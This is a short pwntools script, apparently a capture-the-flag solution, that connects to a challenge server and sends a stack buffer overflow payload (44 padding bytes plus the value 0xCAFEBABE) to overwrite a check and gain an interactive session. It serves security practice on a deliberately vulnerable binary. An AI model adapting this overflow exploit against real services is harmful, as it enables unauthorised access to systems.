
from pwn import * 
context(log_level="debug")

#r = process('./pwn-intended-0x2')
r = remote('chall.csivit.com', 30007)

r.recvuntil('headed?\n')

payload = 'A' * 44
payload += p64(0xCAFEBABE)

r.sendline(payload)
r.recvline()
r.interactive()

